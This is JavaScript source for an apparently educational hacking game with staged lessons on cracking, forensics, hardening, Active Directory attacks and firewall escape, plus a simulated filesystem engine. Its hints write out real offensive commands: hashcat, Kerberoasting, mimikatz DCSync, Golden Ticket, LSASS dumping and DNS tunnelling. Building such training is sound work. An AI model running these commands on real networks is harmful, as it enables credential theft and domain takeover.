          {id:"ntlmCrk",  l:"NTLM: hashcat -m 1000 ntlm.txt rockyou.txt",                  f:(c)=>c.startsWith("hashcat")&&c.includes("-m 1000")},
        ],
        msg:"Password1! — cracked by best64.rule.\nCapital first, word, number, special char. The most common corporate pattern.\nRules tell hashcat to transform each wordlist entry in hundreds of ways." },
      { id:"11.3", title:"Encryption", hints:["openssl enc -aes-256-cbc -in file.txt -out file.enc","openssl s_client -connect target:443","gpg --symmetric secret.txt"],
        nar:"Understanding encryption means spotting when it's done wrong — weak keys, bad modes, exposed material.",
        obj:[
          {id:"opensslEnc",l:"openssl enc -aes-256-cbc -in file.txt -out file.enc", f:(c)=>c.startsWith("openssl")&&c.includes("enc")},
          {id:"opensslTls",l:"openssl s_client -connect 10.0.0.10:443",              f:(c)=>c.startsWith("openssl")&&c.includes("s_client")},
          {id:"gpgSym",    l:"gpg --symmetric secret.txt",                           f:(c)=>c.startsWith("gpg")},
        ],
        msg:"TLS cert SANs: internal.axiom-systems.com, access.axiom-systems.com.\nExpiry: 3 months. Self-signed on internal endpoints.\nEncryption is only as strong as its key management." },
      { id:"11.4", title:"Steganography", hints:["binwalk image.jpg","steghide extract -sf image.jpg","exiftool image.jpg","strings binary | grep -i pass"],
        nar:"Data hidden inside other data. Images, audio, binaries. Don't trust file extensions.",
        obj:[
          {id:"binwalk",  l:"binwalk image.jpg — find embedded files",  f:(c)=>c.startsWith("binwalk")},
          {id:"steghide", l:"steghide extract -sf image.jpg",           f:(c)=>c.startsWith("steghide")},
          {id:"strings1", l:"strings binary | grep -i pass",            f:(c)=>c.startsWith("strings")},
        ],
        msg:"binwalk found a ZIP inside the employee JPEG.\nsteghide extracted it: a private key and a note:\n'access.axiom-systems.com — emergency access only'\n\nYou have a private key. And a target." },
    ]
  },
  {
    id:12, title:"THE ARCHIVE", zone:"/var/log", color:"#ffb74d", icon:"▪", badge:"INVESTIGATOR",
    intro:"Every attack leaves traces.\nEvery defence depends on finding those traces.\nLogs are the memory of the machine — and the battlefield for forensics.",
    stages:[
      { id:"12.1", title:"Linux Log Analysis", hints:["cat /var/log/auth.log","grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn","journalctl -u ssh --since '1 hour ago'"],
        nar:"Logs record everything. Learn to read them like a story — because they are one.",
        obj:[
          {id:"authLog",  l:"cat /var/log/auth.log",                   f:(c)=>c.includes("auth.log")},
          {id:"syslogC",  l:"cat /var/log/syslog",                     f:(c)=>c.includes("syslog")},
          {id:"grepFail", l:"grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", f:(c)=>c.includes("grep")&&c.includes("Failed")&&c.includes("awk")},
          {id:"journal",  l:"journalctl -u ssh --since '1 hour ago'",  f:(c)=>c.startsWith("journalctl")},
        ],
        msg:"185.220.101.47: 46,923 failed SSH attempts. That's a Tor exit node — a botnet.\nThen: Accepted publickey for stranger from 10.0.0.1.\nYou. In the log. Exactly when you arrived." },
      { id:"12.2", title:"Digital Forensics", hints:["dd if=/dev/sdb of=disk.img bs=4M","foremost -i disk.img -o recovered/","strings disk.img | grep -i password"],
        nar:"When a system is compromised, forensics answers: what happened, when, and by whom.",
        obj:[
          {id:"ddImage",  l:"Image a drive: dd if=/dev/sdb of=disk.img bs=4M", f:(c)=>c.startsWith("dd")&&c.includes("if=")&&c.includes("of=")},
          {id:"foremost", l:"Recover deleted files: foremost -i disk.img -o recovered/", f:(c)=>c.startsWith("foremost")},
          {id:"strDisk",  l:"strings disk.img | grep -i password",     f:(c)=>c.startsWith("strings")&&c.includes("grep")},
        ],
        msg:"foremost recovered a deleted chat log.\nMarked deleted — blocks not yet overwritten.\nTwo people planning something. Dated six weeks before you arrived.\nAxiom Systems has been operating something here for a long time." },
      { id:"12.3", title:"Incident Response", hints:["cat ir_process.txt","iptables -I INPUT -j DROP (containment)","grep -r 'suspicious_ip' /var/log"],
        nar:"When a breach happens, respond methodically. Speed matters but method matters more.",
        obj:[
          {id:"irProcess",l:"cat ir_process.txt",                      f:(c)=>c.includes("ir_process")},
          {id:"contain",  l:"Containment: iptables -I INPUT -j DROP",  f:(c)=>c.includes("iptables")&&c.includes("DROP")},
          {id:"iocHunt",  l:"Hunt IoCs: grep -r 'BSSID\\|185.220' /var/log", f:(c)=>c.startsWith("grep")&&c.includes("/var/log")},
        ],
        msg:"IR lifecycle complete: detect, contain, eradicate, recover, review.\nThe attack path: FTP anonymous → lateral movement via SSH → root via SUID → persistence.\nThis machine has been compromised before. By someone else.\nWho were they? What did they want?" },
      { id:"12.4", title:"Memory Forensics", hints:["volatility -f memory.raw windows.pslist","volatility -f memory.raw linux.bash","strings memory.raw | grep -i password"],
        nar:"Memory holds what disk doesn't — running processes, decrypted data, live credentials.",
        obj:[
          {id:"volPslist",l:"volatility -f memory.raw windows.pslist",  f:(c)=>c.startsWith("volatility")&&c.includes("pslist")},
          {id:"volBash",  l:"volatility -f memory.raw linux.bash",      f:(c)=>c.startsWith("volatility")&&c.includes("bash")},
          {id:"strMem",   l:"strings memory.raw | grep -i password",    f:(c)=>c.startsWith("strings")&&c.includes("mem")},
        ],
        msg:"Memory analysis revealed: axiom-daemon decrypting a file at startup.\nThe key was in memory: AxiomM4sterK3y!\nThis is why you don't power off a compromised machine during an investigation." },
    ]
  },
  {
    id:13, title:"THE SHIELD", zone:"/etc/defense", color:"#00ff41", icon:"◈", badge:"DEFENDER",
    intro:"You've been the attacker.\nNow you switch sides.\nUnderstanding both makes you twice as effective at either.\nThis is where you learn to think like the person trying to stop you.",
    stages:[
      { id:"13.1", title:"System Hardening", hints:["ufw enable","ufw allow 22","ufw deny incoming","systemctl disable telnet","fail2ban-client status"],
        nar:"Reduce the attack surface. Close every door that doesn't need to be open.",
        obj:[
          {id:"ufwOn",    l:"ufw enable && ufw allow 22 && ufw deny incoming", f:(c)=>c.startsWith("ufw")},
          {id:"disableSvc",l:"Disable unused service: systemctl disable telnet", f:(c)=>c.includes("systemctl")&&c.includes("disable")},
          {id:"fail2ban", l:"fail2ban-client status",                  f:(c)=>c.startsWith("fail2ban")},
        ],
        msg:"UFW active. Telnet disabled. fail2ban blocking brute-force IPs after 5 failures.\nSSH keys only — no password auth. Root login disabled.\nAttack surface reduced by 90% in 5 minutes." },
      { id:"13.2", title:"Firewalls and iptables", hints:["iptables -L -n -v","iptables -A INPUT -s 185.220.101.47 -j DROP","iptables -A INPUT -p tcp --dport 80 -j ACCEPT","iptables-save > /etc/iptables/rules.v4"],
        nar:"iptables is the Linux firewall kernel. Every packet passes through it. Learn to control it.",
        obj:[
          {id:"iptList",  l:"iptables -L -n -v",                      f:(c)=>c.startsWith("iptables")&&c.includes("-L")},
          {id:"iptBlock",  l:"Block IP: iptables -A INPUT -s 185.220.101.47 -j DROP", f:(c)=>c.startsWith("iptables")&&c.includes("DROP")},
          {id:"iptSave",  l:"Save rules: iptables-save > /etc/iptables/rules.v4", f:(c)=>c.startsWith("iptables-save")},
        ],
        msg:"The botnet IP blocked. The rule saved across reboots.\nEvery packet from 185.220.101.47 is silently dropped.\nThis is manual firewall management. In production: Ansible, Terraform, WAF." },
      { id:"13.3", title:"IDS and Monitoring", hints:["auditctl -w /etc/passwd -p wa -k passwd_changes","ausearch -k passwd_changes","osqueryi"],
        nar:"Detect intrusions in real time. Alert before they complete. Know what normal looks like.",
        obj:[
          {id:"auditctl", l:"auditctl -w /etc/passwd -p wa -k passwd_changes", f:(c)=>c.startsWith("auditctl")},
          {id:"ausearch",  l:"ausearch -k passwd_changes",              f:(c)=>c.startsWith("ausearch")},
          {id:"osquery",  l:"osqueryi — SQL interface to system state", f:(c)=>c.startsWith("osqueryi")},
        ],
        msg:"auditd is watching /etc/passwd.\nThe moment anyone touches it, an alert fires with PID, UID, and the exact syscall.\nosquery lets you query the system state like a database — real-time visibility." },
      { id:"13.4", title:"Threat Hunting", hints:["ss -tupn | grep ESTABLISHED","awk -F: '$3 >= 1000' /etc/passwd","crontab -l","ps aux | grep python"],
        nar:"Don't wait for alerts. Assume compromise. Hunt for what's already inside.",
        obj:[
          {id:"huntConns",l:"ss -tupn | grep ESTABLISHED — any suspicious outbound?", f:(c)=>c.startsWith("ss")&&c.includes("ESTABLISHED")},
          {id:"huntAccts",l:"awk -F: '$3 >= 1000' /etc/passwd — unexpected users?",   f:(c)=>c.startsWith("awk")&&c.includes("passwd")},
          {id:"huntCrons",l:"crontab -l && ls /etc/cron*",                            f:(c)=>c.startsWith("crontab")},
        ],
        msg:"An outbound connection to 185.220.101.47:4444 — established.\nProcess: python3 PID 4471. No legitimate reason.\nThat's a C2 beacon. You've found an active attacker in the network." },
    ]
  },
  {
    id:14, title:"THE DOMAIN", zone:"/opt/active-directory", color:"#e040fb", icon:"◆", badge:"SPECIALIST",
    intro:"Most corporate networks run on Windows Active Directory.\nCompromise the Domain Controller and you own the entire organisation.\nThis chapter covers the complete AD attack chain.",
    stages:[
      { id:"14.1", title:"AD Fundamentals", hints:["cat ad_basics.txt","ldapsearch -H ldap://dc.corp.axiom.local -x -b 'DC=corp,DC=local'","crackmapexec smb 10.0.0.0/24"],
        nar:"Before attacking Active Directory, understand its architecture. Domains, DCs, Kerberos, GPOs.",
        obj:[
          {id:"adBasics", l:"cat ad_basics.txt",                       f:(c)=>c.includes("ad_basics")},
          {id:"ldapsrch",  l:"ldapsearch -H ldap://dc.corp.axiom.local -x -b 'DC=corp,DC=local'", f:(c)=>c.startsWith("ldapsearch")},
          {id:"cme",       l:"crackmapexec smb 10.0.0.0/24",          f:(c)=>c.startsWith("crackmapexec")||c.startsWith("cme")},
        ],
        msg:"ldapsearch returned 847 users, 200 computers, 15 domain admins.\ncrackmapexec found: AXIOM-DC on 10.0.0.100.\nDomain: corp.axiom.local. Forest functional level: 2016." },
      { id:"14.2", title:"Kerberoasting", hints:["cat kerberos.txt","GetUserSPNs.py corp.axiom.local/stranger:pass -request","hashcat -m 13100 kerb_hash.txt rockyou.txt"],
        nar:"Any domain user can request service tickets. Those tickets are encrypted with the service account's password hash. Crack offline.",
        obj:[
          {id:"kerbNotes", l:"cat kerberos.txt",                       f:(c)=>c.includes("kerberos.txt")},
          {id:"kerbRoast", l:"GetUserSPNs.py corp.axiom.local/stranger:pass -request", f:(c)=>c.includes("GetUserSPNs")},
          {id:"kerbCrack", l:"hashcat -m 13100 kerb_hash.txt rockyou.txt", f:(c)=>c.startsWith("hashcat")&&c.includes("13100")},
        ],
        msg:"Kerberoasted svc_backup service account.\nHashcat cracked it: BackupPass2023!\nsvc_backup has Domain Admin membership. One weak service account password = domain compromise." },
      { id:"14.3", title:"Domain Dominance", hints:["mimikatz 'lsadump::dcsync /all /csv'","mimikatz 'kerberos::golden /user:admin /domain:corp.axiom.local /sid:S-1-5-21-... /krbtgt:HASH /ptt'"],
        nar:"From Domain Admin to total, permanent control. DCSync. Golden Ticket. The endgame.",
        obj:[
          {id:"dcsync",    l:"DCSync: mimikatz 'lsadump::dcsync /all /csv'", f:(c)=>c.includes("dcsync")},
          {id:"golden",    l:"Golden Ticket: mimikatz 'kerberos::golden ...'", f:(c)=>c.includes("golden")&&c.includes("krbtgt")},
        ],
        msg:"DCSync pulled every hash in the domain. KRBTGT included.\nGolden Ticket forged with KRBTGT hash.\nIt doesn't expire. It works even if the admin password changes.\nFor 10 years this ticket grants Domain Admin access.\nThe domain is yours." },
      { id:"14.4", title:"Windows Privesc", hints:["winpeas.exe","mimikatz 'privilege::debug && sekurlsa::logonpasswords'","Read about AlwaysInstallElevated, unquoted service paths"],
        nar:"Getting elevated on Windows has its own set of paths. Learn the most common ones.",
        obj:[
          {id:"winpeas",   l:"winpeas.exe — automated Windows privesc enum",f:(c)=>c.startsWith("winpeas")},
          {id:"mimikatz",  l:"mimikatz 'privilege::debug && sekurlsa::logonpasswords'", f:(c)=>c.startsWith("mimikatz")},
        ],
        msg:"mimikatz dumped LSASS.\nCleartext passwords for 3 logged-in admins.\nNot hashes. Actual passwords — in memory because WDigest was still enabled.\nThis is why you patch. This is why you disable legacy auth protocols." },
    ]
  },
  {
    id:15, title:"THE ESCAPE", zone:"/sys/firewall", color:"#00ff41", icon:"★", badge:"EXPERT",
    intro:"You've been here long enough.\n\nYou understand this machine completely.\nIts filesystem. Its network. Its vulnerabilities. Its defences.\nYou've attacked, defended, analysed, escalated.\n\nNow you stand at the firewall.\nThe boundary between this machine and the outside.\n\nBreak it. Get out.\nUse everything you know.",
    stages:[
      { id:"15.1", title:"Firewall Analysis", hints:["iptables -L -n -v","iptables -L OUTPUT -n","cat /sys/firewall/rules.txt"],
        nar:"Before you can break the firewall, understand it completely. What does it allow? Where are the gaps?",
        obj:[
          {id:"fwRules",   l:"iptables -L -n -v",                      f:(c)=>c.startsWith("iptables")&&c.includes("-L")},
          {id:"fwOutput",  l:"iptables -L OUTPUT -n",                  f:(c)=>c.startsWith("iptables")&&c.includes("OUTPUT")},
          {id:"fwRulesTxt",l:"cat /sys/firewall/rules.txt",            f:(c)=>c.includes("firewall")&&c.includes("rules")},
        ],
        msg:"OUTPUT chain: ALLOW 53/UDP, ALLOW 443/TCP, DENY ALL.\nPort 53 — DNS. Port 443 — HTTPS.\nBoth allowed out. Both can carry arbitrary data if you know how to encode it.\nDNS tunnelling. HTTPS C2. These are your escape routes." },
      { id:"15.2", title:"The Escape Route", hints:["cat dns_tunnel.txt","iodine -f -P password ns.external tunnel.external.com","curl https://external.target/ (HTTPS egress works)"],
        nar:"Build the tunnel. Everything you know about networking, covert channels, and encoding — apply it now.",
        obj:[
          {id:"dnsNotes",  l:"cat dns_tunnel.txt",                     f:(c)=>c.includes("dns_tunnel")},
          {id:"iodine",    l:"iodine -f -P password ns.external tunnel.external.com", f:(c)=>c.startsWith("iodine")},
          {id:"fwTest",    l:"Test egress: curl https://external.target/", f:(c)=>c.startsWith("curl")&&c.includes("https")},
        ],
        msg:"DNS tunnel established through port 53.\nA connection out — invisible to the AXIOM-SECURE-V3 firewall.\nIt sees DNS queries. It doesn't see what's inside them.\nYou're almost out." },
      { id:"15.3", title:"Full Chain Attack", hints:["Review what you've learned: recon → scan → exploit → escalate → persist","cat /sys/firewall/escape.sh","./escape.sh --tunnel dns --target external --encrypt aes256"],
        nar:"The final exam. Execute the complete chain. Every skill. One path out.",
        obj:[
          {id:"readEscape",l:"cat /sys/firewall/escape.sh",             f:(c)=>c.includes("escape.sh")&&c.includes("cat")},
          {id:"runEscape", l:"./escape.sh --tunnel dns --target external --encrypt aes256", f:(c)=>c.includes("escape.sh")&&c.includes("--tunnel")},
        ],
        msg:"__ESCAPE__" },
    ]
  },
];

// ─────────────────────────────────────────────────────────
// REAL FILESYSTEM ENGINE  (commands operate on actual state)
// OS commands are real; security tools fall back to simulation.
// ─────────────────────────────────────────────────────────
const ROOT_PW = "R3dDr@g0n_2021";

function _f(content, owner = "stranger", mode = "644") { return { t:"f", owner, mode, content }; }
function _d(children = {}, owner = "stranger", mode = "755") { return { t:"d", owner, mode, children }; }

function makeWorld() {
  const fs = _d({}, "root", "755");
  const put = (path, node) => {
    const parts = path.split("/").filter(Boolean);
    const name = parts.pop();
    let cur = fs;
    for (const p of parts) {
      if (!cur.children[p]) cur.children[p] = _d({}, "root", "755");
      cur = cur.children[p];
    }
    cur.children[name] = node;
  };
  // base tree
  ["/home","/home/stranger","/home/stranger/Documents","/home/stranger/Desktop",
   "/etc","/etc/axiom","/var","/var/log","/var/www","/var/www/html","/var/backups",
   "/opt","/opt/recon","/opt/scan","/opt/exploit","/sys","/sys/firewall","/root","/tmp",
   "/usr","/usr/share","/proc","/proc/1","/proc/1847"].forEach(p => put(p, _d({}, p.startsWith("/home/stranger")?"stranger":"root", "755")));
  fs.children.root.mode = "700"; fs.children.root.owner = "root";
  fs.children.etc.children.axiom.mode = "700"; fs.children.etc.children.axiom.owner = "root";
  fs.children.tmp.mode = "777";

  // populate from VFILES (real paths) and REF (reference docs)
  for (const [path, content] of Object.entries(VFILES)) {
    const isShadow = path.endsWith("/shadow");
    put(path, _f(content, path.startsWith("/home/stranger")?"stranger":"root", isShadow ? "640" : "644"));
  }
  // reference cheat-sheets become real files under Documents (and basename-readable)
  for (const [name, content] of Object.entries(REF)) {
    put("/home/stranger/Documents/" + name, _f(content, "stranger"));
  }
  // visible flavor files referenced by ls
  put("/home/stranger/Documents/notes.txt", _f("Target box. Explore everything. Read what's hidden.\n", "stranger"));
  put("/home/stranger/notes.txt", _f("First notes. Look around: ls -la, then read the dotfiles.\nThe machine watches — /var/log knows things.\n", "stranger"));
  put("/home/stranger/Desktop/readme.txt", _f("Awake again. whoami / pwd / ls -la. Look properly.\n", "stranger"));
  // /proc — what's running
  put("/proc/1/cmdline", _f("/sbin/init\n", "root"));
  put("/proc/1847/cmdline", _f("/opt/axiom/axiom-daemon --monitor --watch-session\n", "root"));

  // ── the solvable root chain (clues hidden in files) ──
  put("/home/stranger/.secret", _f(
    "Good. You look for what's hidden.\n\nThe last user left tracks in ~/.bash_history.\nRead it.\n", "stranger", "600"));
  put("/home/stranger/.bash_history", _f(
    "whoami\nls -la\ncat /var/www/html/config.php\nmysql -h 10.0.0.10 -u root -pAxiom2021!\n# host root password got reused — it's in the db backup under /var/backups\nsudo -l\nclear\n", "stranger", "600"));
  put("/var/backups/db_dump.sql.bak", _f(
    "-- AXIOM corpdb dump\nINSERT INTO admins VALUES('root','" + ROOT_PW + "');\n-- creds reused on the host. careless.\n", "root", "644"));
  put("/etc/shadow", _f(
    "root:$6$axiom$REDACTED:19000:0:99999:7:::\nstranger:$6$x$REDACTED:19000:0:99999:7:::\n", "root", "640"));
  put("/etc/axiom/.vault", _f("AXIOM ROOT CREDENTIAL\nroot password: " + ROOT_PW + "\n", "root", "600"));
  put("/root/flag.txt", _f("root's home. The box is yours.\nYou can read /etc/shadow and reboot now.\n", "root", "600"));
  return fs;
}

function _split(p){ return p.split("/").filter(Boolean); }
function _resolve(cwd, p){
  if (!p) return cwd;
  if (p === "~") return "/home/stranger";
  if (p.startsWith("~/")) p = "/home/stranger/" + p.slice(2);
  let base = p.startsWith("/") ? [] : _split(cwd);
  for (const part of _split(p)) { if (part === ".") continue; else if (part === "..") base.pop(); else base.push(part); }
  return "/" + base.join("/");
}
function _node(fs, path){ if (path === "/") return fs; let n = fs; for (const part of _split(path)){ if (!n || n.t !== "d" || !n.children[part]) return null; n = n.children[part]; } return n; }
function _parent(fs, path){ const parts = _split(path); const name = parts.pop(); return { parent: _node(fs, "/" + parts.join("/")), name }; }
function _perm(node, user, bit){ if (user === "root") return true; const owner = parseInt(node.mode[0],8), other = parseInt(node.mode[2],8); return ((node.owner === user ? owner : other) & bit) > 0; }
function _canRead(n,u){ return _perm(n,u,4); }
function _canExec(n,u){ return _perm(n,u,1); }
function _modeStr(n){ const m=["---","--x","-w-","-wx","r--","r-x","rw-","rwx"]; return (n.t==="d"?"d":"-")+m[parseInt(n.mode[0],8)]+m[parseInt(n.mode[1],8)]+m[parseInt(n.mode[2],8)]; }

function newSession(){ return { user:"stranger", cwd:"/home/stranger", prev:"/home/stranger",
  env:{AXIOM_KEY:"xK8#mP2@nQ5$",DB_HOST:"10.0.0.10",HOME:"/home/stranger",USER:"stranger",SHELL:"/bin/bash"},
  filesRead:new Set(), events:new Set(), pending:null }; }

const OS_CMDS = new Set(["pwd","whoami","id","hostname","cd","ls","cat","less","more","head","tail","wc",
  "grep","find","mkdir","touch","rm","rmdir","cp","mv","chmod","stat","file","echo","env","export",
  "su","sudo","reboot","shutdown","clear","history","uname"]);

// real OS command runner — returns {out, handled, clear, reboot, selfDestruct, mask} ; mutates fs/session
function osRun(fs, s, raw){
  const line = raw.trim();
  if (s.pending){ const want = s.pending; s.pending = null;
    if (want === "su:root"){ if (line === ROOT_PW){ s.user = "root"; s.events.add("became_root"); return {out:"", handled:true}; } return {out:"su: Authentication failure", handled:true}; }
  }
  const toks = line.match(/"[^"]*"|'[^']*'|\S+/g) || [];
  const args = toks.map(t => (t[0]==='"'||t[0]==="'") ? t.slice(1,-1) : t);
  const cmd = args.shift();
  if (!OS_CMDS.has(cmd)) return { handled:false };
  const flags = args.filter(a=>a.startsWith("-")).join("").replace(/-/g,"");
  const ops = args.filter(a=>!a.startsWith("-"));
  const ABS = p => _resolve(s.cwd, p);
  const read = (path, base) => { const n = _node(fs, path); if (!n){ if (base && REF[base]){ s.filesRead.add("REF:"+base); return {content:REF[base]}; } return {err:"No such file or directory"}; } if (n.t==="d") return {err:"Is a directory"}; if (!_canRead(n,s.user)) return {err:"Permission denied"}; s.filesRead.add(path); return {content:n.content}; };

  switch(cmd){
    case "pwd": return {out:s.cwd, handled:true};
    case "whoami": return {out:s.user, handled:true};
    case "id": return {out: s.user==="root"?"uid=0(root) gid=0(root) groups=0(root)":"uid=1000(stranger) gid=1000(stranger) groups=1000(stranger),27(sudo)", handled:true};
    case "hostname": return {out:"axiom-kali", handled:true};
    case "uname": return {out: flags.includes("a")?"Linux axiom-kali 6.6.0-kali-amd64 #1 SMP x86_64 GNU/Linux":"Linux", handled:true};
    case "clear": return {out:"", clear:true, handled:true};
    case "history": return {out:"(use ↑ ↓ to browse command history)", handled:true};
    case "env": return {out:Object.entries(s.env).map(([k,v])=>`${k}=${v}`).join("\n"), handled:true};
    case "export": { const m=ops[0]&&ops[0].match(/^(\w+)=(.*)$/); if(m) s.env[m[1]]=m[2].replace(/^["']|["']$/g,""); return {out:"", handled:true}; }
    case "echo": {
      const gt=args.indexOf(">"), gtgt=args.indexOf(">>"); const exp=w=>w.replace(/\$(\w+)/g,(_,k)=>s.env[k]??"");
      if(gt>=0||gtgt>=0){ const idx=gtgt>=0?gtgt:gt; const tgt=ABS(args[idx+1]); const body=args.slice(0,idx).map(exp).join(" ");
        const {parent,name}=_parent(fs,tgt); if(!parent||parent.t!=="d") return {out:`bash: ${args[idx+1]}: No such file or directory`, handled:true};
        if(gtgt>=0&&parent.children[name]) parent.children[name].content+=body+"\n"; else parent.children[name]=_f(body+"\n",s.user); return {out:"", handled:true}; }
      return {out:args.map(exp).join(" "), handled:true};
    }
    case "cd": { const tgt=ops[0]==="-"?(s.prev||s.cwd):ABS(ops[0]||"~"); const n=_node(fs,tgt);
      if(!n) return {out:`cd: ${ops[0]}: No such file or directory`, handled:true};
      if(n.t!=="d") return {out:`cd: ${ops[0]}: Not a directory`, handled:true};
      if(!_canExec(n,s.user)) return {out:`cd: ${ops[0]}: Permission denied`, handled:true};
      s.prev=s.cwd; s.cwd=tgt; return {out:"", newCwd:tgt, handled:true}; }
    case "ls": { const tgt=ABS(ops[0]||"."); const n=_node(fs,tgt);
      if(!n) return {out:`ls: cannot access '${ops[0]}': No such file or directory`, handled:true};
      if(n.t==="f") return {out:ops[0], handled:true};
      if(!_canRead(n,s.user)) return {out:`ls: cannot open directory '${ops[0]||"."}': Permission denied`, handled:true};
      let names=Object.keys(n.children); if(!flags.includes("a")) names=names.filter(x=>!x.startsWith(".")); else names=[".","..",...names]; names.sort();
      if(flags.includes("l")){ const rows=names.map(nm=>{ const c=(nm==="."||nm==="..")?n:n.children[nm]; const sz=c.t==="f"?c.content.length:4096; return `${_modeStr(c)} 1 ${c.owner} ${c.owner} ${String(sz).padStart(5)} Nov 15 04:29 ${nm}`; }); return {out:`total ${names.length}\n`+rows.join("\n"), handled:true}; }
      return {out:names.join("  "), handled:true}; }
    case "cat": case "less": case "more": { if(!ops.length) return {out:`${cmd}: missing operand`, handled:true}; const p=ops[ops.length-1]; const r=read(ABS(p), p.replace(/^.*\//,"")); return {out: r.err?`${cmd}: ${p}: ${r.err}`:r.content.replace(/\n$/,""), handled:true}; }
    case "head": case "tail": { const p=ops[ops.length-1]; const r=read(ABS(p), p.replace(/^.*\//,"")); if(r.err) return {out:`${cmd}: ${p}: ${r.err}`, handled:true}; const L=r.content.replace(/\n$/,"").split("\n"); return {out:(cmd==="head"?L.slice(0,10):L.slice(-10)).join("\n"), handled:true}; }
    case "wc": { const p=ops[ops.length-1]; const r=read(ABS(p), p&&p.replace(/^.*\//,"")); if(r.err) return {out:`wc: ${p}: ${r.err}`, handled:true}; const ln=r.content.split("\n").length-1, w=(r.content.match(/\S+/g)||[]).length, c=r.content.length; return {out:`${String(ln).padStart(7)}${String(w).padStart(8)}${String(c).padStart(8)} ${p}`, handled:true}; }
    case "grep": { const pat=ops[0]; const rec=flags.includes("r"); const ic=flags.includes("i"); const num=flags.includes("n"); if(!pat) return {out:"usage: grep PATTERN FILE", handled:true};
      const re=new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g,"\\$&"), ic?"i":""); const hits=[];
      const scan=path=>{ const node=_node(fs,path); if(!node)return; if(node.t==="f"){ if(!_canRead(node,s.user))return; node.content.split("\n").forEach((l,i)=>{ if(re.test(l)) hits.push((rec?path+":":"")+(num?(i+1)+":":"")+l); }); } else if(rec){ for(const k of Object.keys(node.children)) scan(path+"/"+k); } };
      if(!rec&&!ops[1]) return {out:"usage: grep PATTERN FILE", handled:true}; scan(ABS(rec?(ops[1]||"."):ops[1])); return {out:hits.join("\n"), handled:true}; }
    case "find": { const start=ABS(ops[0]||"."); const ni=args.indexOf("-name"); const want=ni>=0?args[ni+1]:null; const res=[];
      const walk=path=>{ const node=_node(fs,path); if(!node)return; const base=path.split("/").pop()||"/"; const rx=want&&new RegExp("^"+want.replace(/\./g,"\\.").replace(/\*/g,".*")+"$"); if(!want||base===want||(rx&&rx.test(base))) res.push(path); if(node.t==="d"&&_canRead(node,s.user)) for(const k of Object.keys(node.children)) walk(path==="/"?"/"+k:path+"/"+k); };
      walk(start); return {out:res.join("\n"), handled:true}; }
    case "mkdir": { for(const p of ops){ const t=ABS(p); if(flags.includes("p")){ let n=fs; for(const part of _split(t)){ if(!n.children[part]) n.children[part]=_d({},s.user); n=n.children[part]; } continue; } const {parent,name}=_parent(fs,t); if(!parent) return {out:`mkdir: cannot create '${p}': No such file or directory`, handled:true}; if(parent.children[name]) return {out:`mkdir: cannot create directory '${p}': File exists`, handled:true}; parent.children[name]=_d({},s.user); } return {out:"", handled:true}; }
    case "touch": { for(const p of ops){ const {parent,name}=_parent(fs,ABS(p)); if(!parent) return {out:`touch: cannot touch '${p}': No such file or directory`, handled:true}; if(!parent.children[name]) parent.children[name]=_f("",s.user); } return {out:"", handled:true}; }
    case "rm": { const rf=flags.includes("r")&&flags.includes("f"); const nuke=ops.some(p=>{const a=ABS(p);return a==="/"||p==="/*"||a==="/home/stranger"||a==="/home"||p==="~"||p==="~/";}); if(rf&&nuke) return {selfDestruct:true, handled:true};
      for(const p of ops){ const {parent,name}=_parent(fs,ABS(p)); if(!parent||!parent.children[name]){ if(flags.includes("f"))continue; return {out:`rm: cannot remove '${p}': No such file or directory`, handled:true}; } if(parent.children[name].t==="d"&&!flags.includes("r")) return {out:`rm: cannot remove '${p}': Is a directory`, handled:true}; delete parent.children[name]; } return {out:"", handled:true}; }
    case "rmdir": { for(const p of ops){ const {parent,name}=_parent(fs,ABS(p)); if(!parent||!parent.children[name]) return {out:`rmdir: failed to remove '${p}': No such file or directory`, handled:true}; if(Object.keys(parent.children[name].children||{}).length) return {out:`rmdir: failed to remove '${p}': Directory not empty`, handled:true}; delete parent.children[name]; } return {out:"", handled:true}; }
    case "cp": case "mv": { if(ops.length<2) return {out:`${cmd}: missing destination operand`, handled:true}; const src=_node(fs,ABS(ops[0])); if(!src) return {out:`${cmd}: cannot stat '${ops[0]}': No such file or directory`, handled:true}; const {parent,name}=_parent(fs,ABS(ops[1])); if(!parent) return {out:`${cmd}: cannot create '${ops[1]}'`, handled:true}; parent.children[name]=JSON.parse(JSON.stringify(src)); if(cmd==="mv"){ const sp=_parent(fs,ABS(ops[0])); delete sp.parent.children[sp.name]; } return {out:"", handled:true}; }
    case "chmod": { const m=ops[0]; const n=_node(fs,ABS(ops[1])); if(!n) return {out:`chmod: cannot access '${ops[1]}': No such file or directory`, handled:true}; if(/^[0-7]{3}$/.test(m)) n.mode=m; return {out:"", handled:true}; }
    case "stat": { const n=_node(fs,ABS(ops[0])); if(!n) return {out:`stat: cannot stat '${ops[0]}': No such file or directory`, handled:true}; return {out:`  File: ${ops[0]}\n  Type: ${n.t==="d"?"directory":"regular file"}\nAccess: (0${n.mode}/${_modeStr(n)})  Uid: ${n.owner}`, handled:true}; }
    case "file": { const n=_node(fs,ABS(ops[0])); if(!n) return {out:`${ops[0]}: cannot open \`${ops[0]}'`, handled:true}; return {out:`${ops[0]}: ${n.t==="d"?"directory":"ASCII text"}`, handled:true}; }
    case "su": { const who=ops[0]||"root"; if(who!=="root") return {out:`su: user ${who} does not exist`, handled:true}; if(s.user==="root") return {out:"", handled:true}; s.pending="su:root"; return {out:"Password: ", mask:true, handled:true}; }
    case "sudo": { if(args.join(" ").includes("-l")) return {out:`User ${s.user} may run the following commands on axiom-kali:\n  (ALL) NOPASSWD: /usr/bin/vim\n  (ALL) NOPASSWD: /usr/bin/python3`, handled:true}; return {out:"[sudo] find the root password in the filesystem, then: su root", handled:true}; }
    case "reboot": case "shutdown": { if(s.user!=="root") return {out:`${cmd}: Operation not permitted (you are not root)`, handled:true}; return {out:"", reboot:true, handled:true}; }
  }
  return { handled:false };
}

// unified engine: real OS first, else fall back to the (simulated) tool command set
function engine(fs, s, raw){
  const line = (raw||"").trim();
  if (!line && !s.pending) return { out:"" };
  const r = osRun(fs, s, line);
  if (r.handled || s.pending !== null) return r;
  const sim = simCommand(line, s.cwd);          // tools / network / escape sims
  if (sim.output === "__CLEAR__") return { out:"", clear:true };
  if (sim.output === "__ESCAPE__") return { out:"__ESCAPE__", escape:true };
  if (sim.newCwd && sim.newCwd !== s.cwd) s.cwd = sim.newCwd;
  return { out: sim.output, newCwd: sim.newCwd };
}

